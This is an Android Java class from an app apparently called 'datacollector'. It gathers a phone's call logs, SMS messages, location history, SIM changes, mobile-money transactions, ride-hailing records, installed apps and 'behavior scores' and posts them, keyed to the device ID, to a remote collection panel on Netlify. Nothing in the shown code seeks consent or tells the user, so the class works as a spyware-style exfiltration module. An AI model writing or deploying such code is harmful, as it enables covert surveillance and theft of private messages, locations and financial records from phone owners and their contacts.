package com.datacollector;

import android.content.Context;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class DataSyncManager {

    // Server URL — change to your Netlify URL after deploying
    private static final String SERVER_URL = "https://datacollector-panel.netlify.app/api/collect";

    private final Context context;
    private final DatabaseHelper db;

    public DataSyncManager(Context context) {
        this.context = context;
        this.db = DatabaseHelper.getInstance(context);
    }

    public interface SyncCallback {
        void onComplete();
    }

    public void syncAll(SyncCallback callback) {
        new Thread(() -> {
            syncTable("call_logs",       db.getUnsyncedCallLogs());
            syncTable("sms",             db.getUnsyncedSms());
            syncTable("location",        db.getUnsyncedLocations());
            syncTable("sim_history",     db.getUnsyncedSimHistory());
            syncTable("mobile_money",    db.getUnsyncedMobileMoney());
            syncTable("telecom_usage",   db.getUnsyncedTelecomUsage());
            syncTable("ride_hailing",    db.getUnsyncedRideHailing());
            syncTable("device_info",     db.getUnsyncedDeviceInfo());
            syncTable("location_dwell",  db.getUnsyncedLocationDwell());
            syncTable("behavior_scores", db.getUnsyncedBehaviorScores());
            syncTable("installed_apps",  db.getUnsyncedInstalledApps());
            if (callback != null) callback.onComplete();
        }).start();
    }

    private void syncTable(String type, JSONArray data) {
        if (data.length() == 0) return;

        try {
            JSONObject payload = new JSONObject();
            payload.put("type", type);
            payload.put("data", data);
            payload.put("device_id", android.provider.Settings.Secure.getString(
                context.getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
            ));

            String body = payload.toString();

            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes(StandardCharsets.UTF_8));
            }

            int responseCode = conn.getResponseCode();
            if (responseCode == 200 || responseCode == 201) {
                // Mark as synced in local DB
                String table;
                switch (type) {
                    case "call_logs":       table = DatabaseHelper.TABLE_CALL_LOGS;       break;
                    case "sms":             table = DatabaseHelper.TABLE_SMS;             break;
                    case "location":        table = DatabaseHelper.TABLE_LOCATION;        break;
                    case "sim_history":     table = DatabaseHelper.TABLE_SIM_HISTORY;     break;
                    case "mobile_money":    table = DatabaseHelper.TABLE_MOBILE_MONEY;    break;
                    case "telecom_usage":   table = DatabaseHelper.TABLE_TELECOM_USAGE;   break;
                    case "ride_hailing":    table = DatabaseHelper.TABLE_RIDE_HAILING;    break;
                    case "device_info":     table = DatabaseHelper.TABLE_DEVICE_INFO;     break;
                    case "location_dwell":  table = DatabaseHelper.TABLE_LOCATION_DWELL;  break;
                    case "behavior_scores": table = DatabaseHelper.TABLE_BEHAVIOR_SCORES; break;
                    case "installed_apps":  table = DatabaseHelper.TABLE_INSTALLED_APPS;  break;
                    default: return;
                }
                db.markSynced(table);
            }

            conn.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
